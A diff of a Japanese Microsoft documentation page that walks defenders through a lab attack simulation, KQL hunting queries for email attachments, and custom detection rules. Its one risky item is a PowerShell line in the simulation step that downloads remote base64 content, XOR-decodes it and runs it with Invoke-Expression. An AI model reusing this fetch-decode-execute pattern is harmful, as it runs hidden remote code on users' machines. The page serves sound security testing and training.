@@ -17,14 +17,15 @@ manager: dansimp
 audience: ITPro
 ms.collection:
 - M365-security-compliance
-- m365solution-evalutatemtp
+- m365solution-scenario
+- m365solution-pilotmtpproject
 ms.topic: conceptual
-ms.openlocfilehash: e6cf01f5540e383fb56e387cd07b455741221dc5
-ms.sourcegitcommit: 9d8d071659e662c266b101377e24549963e43fef
+ms.openlocfilehash: f165a34d5e9df2f3502a9d9c6230fed9b73b758b
+ms.sourcegitcommit: a83acd5b9eeefd2e20e5bac916fe29d09fb53de9
 ms.translationtype: MT
 ms.contentlocale: ja-JP
-ms.lasthandoff: 10/06/2020
-ms.locfileid: "48368095"
+ms.lasthandoff: 10/10/2020
+ms.locfileid: "48418147"
 ---
 # <a name="run-your-microsoft-threat-protection-attack-simulations"></a>Microsoft の脅威保護攻撃のシミュレーションを実行する  
 
@@ -92,21 +93,23 @@ ms.locfileid: "48368095"
 準備段階で既にパイロット環境を構成してあるので、このシナリオでは、テストデバイスとドメインコントローラーという2つのデバイスがあることを確認してください。
 
 1.  テナントで microsoft [Threat Microsoft Threat Protection が有効になっ](https://docs.microsoft.com/microsoft-365/security/mtp/mtp-enable#starting-the-service)ていることを確認します。
+
 2.  テストドメインコントローラーの構成を確認します。
+
     - デバイスは Windows Server 2008 R2 以降のバージョンで実行されます。
     - テストドメインコントローラーを [Azure Advanced Threat Protection に設定](https://docs.microsoft.com/azure/security-center/security-center-wdatp) し、 [リモート管理](https://docs.microsoft.com/windows-server/administration/server-manager/configure-remote-management-in-server-manager)を有効にします。    
     - [AZURE ATP と Microsoft Cloud App Security 統合](https://docs.microsoft.com/cloud-app-security/aatp-integration)が有効になっていることを確認します。
     - ドメインにテストユーザーが作成されます。管理者のアクセス許可は必要ありません。
 
 3.  テストデバイスの構成を確認します。
-    <br>
-    a.  デバイスは Windows 10 バージョン1903またはそれ以降のバージョンで実行されます。
-    <br>
-    b.  テストデバイスはテストドメインに参加しています。
-    <br>
-    c.  [Windows Defender ウイルス対策を有効](https://docs.microsoft.com/windows/security/threat-protection/windows-defender-antivirus/configure-windows-defender-antivirus-features)にします。 Windows Defender ウイルス対策を有効にする際に問題が発生した場合は、この [トラブルシューティングのトピック](https://docs.microsoft.com/windows/security/threat-protection/microsoft-defender-atp/troubleshoot-onboarding#ensure-that-windows-defender-antivirus-is-not-disabled-by-a-policy)を参照してください。
-    <br>
-    d.   テストデバイスが [Microsoft Defender Advanced Threat Protection (MDATP) に利用](https://docs.microsoft.com/windows/security/threat-protection/microsoft-defender-atp/configure-endpoints)していることを確認します。
+ 
+    1.  デバイスは Windows 10 バージョン1903またはそれ以降のバージョンで実行されます。
+    
+    1.  テストデバイスはテストドメインに参加しています。
+    
+    1.  [Windows Defender ウイルス対策を有効](https://docs.microsoft.com/windows/security/threat-protection/windows-defender-antivirus/configure-windows-defender-antivirus-features)にします。 Windows Defender ウイルス対策を有効にする際に問題が発生した場合は、この [トラブルシューティングのトピック](https://docs.microsoft.com/windows/security/threat-protection/microsoft-defender-atp/troubleshoot-onboarding#ensure-that-windows-defender-antivirus-is-not-disabled-by-a-policy)を参照してください。
+    
+    1.  テストデバイスが [Microsoft Defender Advanced Threat Protection (MDATP) に利用](https://docs.microsoft.com/windows/security/threat-protection/microsoft-defender-atp/configure-endpoints)していることを確認します。
 
 既存のテナントを使用し、デバイスグループを実装する場合は、テストデバイス用の専用デバイスグループを作成し、構成 UX の最上位レベルにプッシュします。
 
@@ -120,15 +123,17 @@ Attack scenario シミュレーションを実行するには、次の手順を�
 2.  テストデバイスで Windows PowerShell ウィンドウを開きます。
 
 3.  次のシミュレーションスクリプトをコピーします。
-```
-[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12;$xor
-= [System.Text.Encoding]::UTF8.GetBytes('WinATP-Intro-Injection');$base64String = (Invoke-WebRequest -URI "https://winatpmanagement.windows.com/client/management/static/MTP_Fileless_Recon.txt"
--UseBasicParsing).Content;Try{ $contentBytes = [System.Convert]::FromBase64String($base64String) } Catch { $contentBytes = [System.Convert]::FromBase64String($base64String.Substring(3)) };$i = 0;
-$decryptedBytes = @();$contentBytes.foreach{ $decryptedBytes += $_ -bxor $xor[$i];
-$i++; if ($i -eq $xor.Length) {$i = 0} };Invoke-Expression ([System.Text.Encoding]::UTF8.GetString($decryptedBytes))
-```
->[!NOTE]
->このドキュメントを web ブラウザーで開くと、特定の文字を失わずに完全なテキストをコピーしたり、改行を加えることができない問題が発生することがあります。 このドキュメントをダウンロードし、Adobe Reader で開きます。
+
+    ```powershell
+    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12;$xor
+    = [System.Text.Encoding]::UTF8.GetBytes('WinATP-Intro-Injection');$base64String = (Invoke-WebRequest -URI "https://winatpmanagement.windows.com/client/management/static/MTP_Fileless_Recon.txt"
+    -UseBasicParsing).Content;Try{ $contentBytes = [System.Convert]::FromBase64String($base64String) } Catch { $contentBytes = [System.Convert]::FromBase64String($base64String.Substring(3)) };$i = 0;
+    $decryptedBytes = @();$contentBytes.foreach{ $decryptedBytes += $_ -bxor $xor[$i];
+    $i++; if ($i -eq $xor.Length) {$i = 0} };Invoke-Expression ([System.Text.Encoding]::UTF8.GetString($decryptedBytes))
+    ```
+    
+    > [!NOTE]
+    > このドキュメントを web ブラウザーで開くと、特定の文字を失わずに完全なテキストをコピーしたり、改行を加えることができない問題が発生することがあります。 このドキュメントをダウンロードし、Adobe Reader で開きます。
 
 4. プロンプトで、貼り付けてコピーしたスクリプトを実行します。
 
@@ -141,7 +146,7 @@ $i++; if ($i -eq $xor.Length) {$i = 0} };Invoke-Expression ([System.Text.Encodin
 
 このスクリプトが完了すると、PowerShell コンソールにメッセージが表示されます。
 
-```
+```console
 ran NetSessionEnum against [DC Name] with return code result 0      
 ```
 
@@ -333,96 +338,98 @@ Microsoft 365 セキュリティセンターポータルで、インシデント
 
 **検索を探す**
 1.  Security.microsoft.com ポータルを開きます。
+
 2.  [検索] **> [詳細**] を探します。
 
     ![M365 セキュリティセンターポータルのナビゲーションバーでの高度な検索のスクリーンショット](../../media/mtp/fig17.png) 
 
 3.  電子メールイベントを収集することによって開始するクエリを作成します。
-    a.  [クエリ] ウィンドウで、[新規] を選択します。
-    b.  [EmailEvents] テーブルをスキーマからダブルクリックします。
 
-```
-EmailEvents 
-```                                        
+    1.  [クエリ] ウィンドウで、[新規] を選択します。
+    
+    1.  [EmailEvents] テーブルをスキーマからダブルクリックします。
 
-   c.   時間枠を過去24時間に変更します。 上記のシミュレーションを実行したときに送信した電子メールが過去24時間であったとして、そうでない場合は、時間枠を変更します。
-   ![タイムフレームを変更できる場所のスクリーンショット。 ドロップダウンメニューを開いて、時間枠オプションの範囲から選択する](../../media/mtp/fig18.png) 
+        ```
+        EmailEvents 
+        ```                                        
 
+    1.  時間枠を過去24時間に変更します。 上記のシミュレーションを実行したときに送信した電子メールが過去24時間であったとして、そうでない場合は、時間枠を変更します。
+    
+        ![タイムフレームを変更できる場所のスクリーンショット。 ドロップダウンメニューを開いて、時間枠オプションの範囲から選択する](../../media/mtp/fig18.png) 
 
-   d.    クエリを実行します。  パイロットの環境によっては、多くの結果が得られる場合があります。  
+    1.  クエリを実行します。  パイロットの環境によっては、多くの結果が得られる場合があります。  
 
->[!NOTE]
->データの戻りを制限するには、フィルターオプションの次の手順を参照してください。
+        > [!NOTE]
+        > データの戻りを制限するには、フィルターオプションの次の手順を参照してください。
 
-   ![高度な検索クエリ結果のスクリーンショット](../../media/mtp/fig19.png) 
+        ![高度な検索クエリ結果のスクリーンショット](../../media/mtp/fig19.png) 
 
->[!NOTE]
->高度な検索では、クエリ結果が表形式のデータとして表示されます。 グラフなどの他の形式のデータの表示を選択することもできます。    
+        > [!NOTE]
+        > 高度な検索では、クエリ結果が表形式のデータとして表示されます。 グラフなどの他の形式のデータの表示を選択することもできます。    
 
-   e.    結果を確認し、開いた電子メールを識別できるかどうかを確認します。  高度な検索でメッセージが表示されるまでに最大2時間かかる場合があります。 メール環境が大きく、多くの結果がある場合は、[ **フィルターの表示] オプション** を使用してメッセージを検索することもできます。 
+    1.  結果を確認し、開いた電子メールを識別できるかどうかを確認します。  高度な検索でメッセージが表示されるまでに最大2時間かかる場合があります。 メール環境が大きく、多くの結果がある場合は、[ **フィルターの表示] オプション** を使用してメッセージを検索することもできます。 
 
-   このサンプルでは、電子メールは Yahoo アカウントから送信されました。 [ **+** SenderFromDomain] セクションの下にある **yahoo.com** の横のアイコンをクリックし、[ **適用** ] をクリックして、選択したドメインをクエリに追加します。  テストメッセージの送信に使用したドメインまたはメールアカウントは、「シミュレーションを実行して結果をフィルター処理する」の手順1で使用します。  クエリをもう一度実行して、シミュレーションからのメッセージが表示されることを確認するために、小さな結果セットを取得します。
+        このサンプルでは、電子メールは Yahoo アカウントから送信されました。 [ **+** SenderFromDomain] セクションの下にある **yahoo.com** の横のアイコンをクリックし、[ **適用** ] をクリックして、選択したドメインをクエリに追加します。  テストメッセージの送信に使用したドメインまたはメールアカウントは、「シミュレーションを実行して結果をフィルター処理する」の手順1で使用します。  クエリをもう一度実行して、シミュレーションからのメッセージが表示されることを確認するために、小さな結果セットを取得します。
    
-   ![フィルターのスクリーンショット。 フィルターを使用して検索を絞り込んで、探しているものをすばやく検索します。](../../media/mtp/fig20.png) 
+        ![フィルターのスクリーンショット。 フィルターを使用して検索を絞り込んで、探しているものをすばやく検索します。](../../media/mtp/fig20.png) 
 
+        ```console
+        EmailEvents 
+        | where SenderMailFromDomain == "yahoo.com"
+        ```
 
-```
-EmailEvents 
-| where SenderMailFromDomain == "yahoo.com"
-```
-
-   f.   クエリから結果の行をクリックして、レコードを検査できるようにします。
-   ![高度な検索結果が選択されたときに開く、[レコードの検査] パネルのスクリーンショット](../../media/mtp/fig21.png) 
-
+    1.  クエリから結果の行をクリックして、レコードを検査できるようにします。
+   
+        ![高度な検索結果が選択されたときに開く、[レコードの検査] パネルのスクリーンショット](../../media/mtp/fig21.png) 
 
 4.  これで、電子メールが表示されることを確認できたので、添付ファイルのフィルターを追加します。 環境内の添付ファイルを含むすべての電子メールにフォーカスします。 このシナリオでは、受信メールに焦点を絞り、環境から送信されるものではありません。 追加したフィルターを削除してメッセージを見つけ、"|" を追加します。**attachmentcount > 0**および**emaildirection**"  ==  **Inbound" "**
 
-次のクエリは、すべての電子メールイベントの最初のクエリよりも短い一覧で結果を表示します。
+    次のクエリは、すべての電子メールイベントの最初のクエリよりも短い一覧で結果を表示します。
 
-```
-EmailEvents 
-| where AttachmentCount > 0 and EmailDirection == "Inbound"
+    ```console
+    EmailEvents 
+    | where AttachmentCount > 0 and EmailDirection == "Inbound"
 
-```
+    ```
 
 5.  次に、添付ファイルについての情報 (ファイル名、ハッシュなど) を結果セットに追加します。 これを行うには、 **Emailattachmentinfo** テーブルに参加します。 この場合、参加に使用する共通のフィールドは、 **Networkmessageid** と **RecipientObjectId**です。
 
-次のクエリにも追加行 "|" が含まれています。 **プロジェクト-** 電子メールとタイムスタンプの名前を変更するには、次の手順で追加するファイル操作に関連するメールとタイムスタンプに関連するタイムスタンプを識別するのに役立ちます。
+    次のクエリにも追加行 "|" が含まれています。 **プロジェクト-** 電子メールとタイムスタンプの名前を変更するには、次の手順で追加するファイル操作に関連するメールとタイムスタンプに関連するタイムスタンプを識別するのに役立ちます。
 
-```
-EmailEvents 
-| where AttachmentCount > 0 and EmailDirection == "Inbound"
-| project-rename EmailTimestamp=Timestamp 
-| join EmailAttachmentInfo on NetworkMessageId, RecipientObjectId
-```
+    ```console
+    EmailEvents 
+    | where AttachmentCount > 0 and EmailDirection == "Inbound"
+    | project-rename EmailTimestamp=Timestamp 
+    | join EmailAttachmentInfo on NetworkMessageId, RecipientObjectId
+    ```
 
 6.  次に、 **Emailattachmentinfo**テーブルの**SHA256**値を使用して、そのハッシュの**devicefileevents** (エンドポイントで発生したファイルアクション) を検索します。  ここに示す共通のフィールドは、添付ファイルの SHA256 ハッシュです。
 
-生成されたテーブルにはエンドポイント (Microsoft Defender ATP) の詳細が含まれるようになりました (この場合は、FileCreated イベントのみを対象としてフィルター処理された)、ファイルが保存されていたこと プロセスに関連付けられているアカウント名も含まれます。
+    生成されたテーブルにはエンドポイント (Microsoft Defender ATP) の詳細が含まれるようになりました (この場合は、FileCreated イベントのみを対象としてフィルター処理された)、ファイルが保存されていたこと プロセスに関連付けられているアカウント名も含まれます。
 
-```
-EmailEvents 
-| where AttachmentCount > 0 and EmailDirection == "Inbound"
-| project-rename EmailTimestamp=Timestamp 
-| join EmailAttachmentInfo on NetworkMessageId, RecipientObjectId 
-| join DeviceFileEvents on SHA256 
-| where ActionType == "FileCreated"
-```
+    ```console
+    EmailEvents 
+    | where AttachmentCount > 0 and EmailDirection == "Inbound"
+    | project-rename EmailTimestamp=Timestamp 
+    | join EmailAttachmentInfo on NetworkMessageId, RecipientObjectId 
+    | join DeviceFileEvents on SHA256 
+    | where ActionType == "FileCreated"
+    ```
 
-これで、ユーザーが添付ファイルを開いた、または保存したすべての受信メールを識別するクエリが作成されました。 また、このクエリを調整して、特定の送信者ドメイン、ファイルサイズ、ファイルの種類などをフィルター処理することもできます。
+    これで、ユーザーが添付ファイルを開いた、または保存したすべての受信メールを識別するクエリが作成されました。 また、このクエリを調整して、特定の送信者ドメイン、ファイルサイズ、ファイルの種類などをフィルター処理することもできます。
 
 7.  関数は特別な結合の一種であり、そのファイルの流行、署名者、発行者の情報など、より多くの TI データを取得することができます。 ファイルの詳細を取得するには、 **Fileprofile ()** 関数エンリッチメントを使用します。
 
-```
-EmailEvents 
-| where AttachmentCount > 0 and EmailDirection == "Inbound"
-| project-rename EmailTimestamp=Timestamp 
-| join EmailAttachmentInfo on NetworkMessageId, RecipientObjectId
-| join DeviceFileEvents on SHA256 
-| where ActionType == "FileCreated"
-| distinct SHA1
-| invoke FileProfile()
-```
+    ```console
+    EmailEvents 
+    | where AttachmentCount > 0 and EmailDirection == "Inbound"
+    | project-rename EmailTimestamp=Timestamp 
+    | join EmailAttachmentInfo on NetworkMessageId, RecipientObjectId
+    | join DeviceFileEvents on SHA256 
+    | where ActionType == "FileCreated"
+    | distinct SHA1
+    | invoke FileProfile()
+    ```
 
 
 **検出を作成する**
@@ -435,15 +442,15 @@ EmailEvents
     
     ![高度な検索ページの [検出ルールの作成] をクリックできる場所のスクリーンショット](../../media/mtp/fig22.png) 
 
->[!NOTE]
->[ **検出ルールの作成** ] をクリックした場合、クエリに構文エラーがあると、検出ルールは保存されません。 クエリをもう一度確認して、エラーがないことを確認してください。 
+    > [!NOTE]
+    > [ **検出ルールの作成** ] をクリックした場合、クエリに構文エラーがあると、検出ルールは保存されません。 クエリをもう一度確認して、エラーがないことを確認してください。 
 
 
 2.  必要なフィールドに情報を入力して、セキュリティチームが警告を理解できるようにし、生成された理由と、実行する必要のあるアクションについて説明します。 
 
     ![アラートの詳細を定義できる [検出ルールの作成] ページのスクリーンショット](../../media/mtp/fig23.png)
 
-この検出ルールのアラートについて次のユーザーに情報を提供できるように、わかりやすいようにフィールドに記入してください。 
+    この検出ルールのアラートについて次のユーザーに情報を提供できるように、わかりやすいようにフィールドに記入してください。 
 
 3.  この通知で影響を受けるエンティティを選択します。 この場合は、[ **デバイス** と **メールボックス**] を選択します。
 
@@ -458,7 +465,7 @@ EmailEvents
 
     ![通知ルールのスコープを設定できる [検出ルールの作成] ページのスクリーンショットに表示される結果に対する期待を管理する](../../media/mtp/fig26.png) 
 
-このようなパイロットについては、運用環境のテストデバイスのサブセットに制限することをお勧めします。
+    このようなパイロットについては、運用環境のテストデバイスのサブセットに制限することをお勧めします。
 
 6.  **[作成]** を選択します。 次に、ナビゲーションパネルから [ **カスタム検出ルール** ] を選択します。
  
@@ -466,9 +473,9 @@ EmailEvents
 
     ![ルールと実行の詳細を表示する [検出ルール] ページのスクリーンショット](../../media/mtp/fig27b.png) 
 
-このページでは、[詳細] ページを開く検出ルールを選択できます。 
+    このページでは、[詳細] ページを開く検出ルールを選択できます。 
 
-![[電子メールの添付ファイル] ページのスクリーンショット。ルールの実行の状態を確認したり、通知やアクションをトリガーしたり、検出を編集したりすることができます。](../../media/mtp/fig28.png) 
+    ![[電子メールの添付ファイル] ページのスクリーンショット。ルールの実行の状態を確認したり、通知やアクションをトリガーしたり、検出を編集したりすることができます。](../../media/mtp/fig28.png) 
 
 ### <a name="additional-advanced-hunting-walk-through-exercises"></a>その他の高度な検索ウォークスルー演習
 
@@ -477,7 +484,7 @@ EmailEvents
 >[!NOTE]
 >パイロットテストラボ環境で検索クエリを実行するには、独自の GitHub アカウントを用意してください。  
 
-| **タイトル** | **説明** | **MP4 のダウンロード** | **YouTube の鑑賞** | **使用する CSL ファイル** |
+|  Title  |  説明  |  MP4 のダウンロード  |  YouTube の鑑賞  |  使用する CSL ファイル  |
 |:-----|:-----|:-----|:-----|:-----|
 | エピソード 1: KQL の基礎 | Microsoft の脅威保護の高度な検索機能の基本事項について説明します。 使用できる高度な検索データと基本的な KQL 構文および演算子について説明します。 | [ MP4](https://aka.ms/MTP15JUL20_MP4) | [YouTube](https://youtu.be/0D9TkGjeJwM) | [エピソード 1: Git の CSL ファイル](https://github.com/microsoft/Microsoft-threat-protection-Hunting-Queries/blob/master/Webcasts/TrackingTheAdversary/Episode%201%20-%20KQL%20Fundamentals.csl) |
 | エピソード 2: 結合 | 高度な検索でデータについて学習を続け、テーブルを結合する方法について説明します。 インナー、outer、unique、および半結合、および既定の Kusto innerunique join のニュアンスについて説明します。 | [MP4](https://aka.ms/MTP22JUL20_MP4) | [YouTube](https://youtu.be/LMrO6K5TWOU) | [エピソード 2: Git の CSL ファイル](https://github.com/microsoft/Microsoft-threat-protection-Hunting-Queries/blob/master/Webcasts/TrackingTheAdversary/Episode%202%20-%20Joins.csl) |
